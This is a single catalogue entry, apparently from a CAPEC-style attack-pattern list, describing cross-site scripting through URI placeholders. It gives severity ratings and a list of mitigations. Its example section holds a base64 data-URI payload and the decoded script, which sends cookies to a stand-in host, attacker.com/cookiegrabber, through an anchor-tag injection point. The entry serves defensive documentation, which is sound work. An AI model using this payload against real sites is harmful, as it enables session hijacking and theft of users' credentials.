244,XSS Targeting URI Placeholders,"An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.",High,High,"::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::","::The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An adversary could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.::"
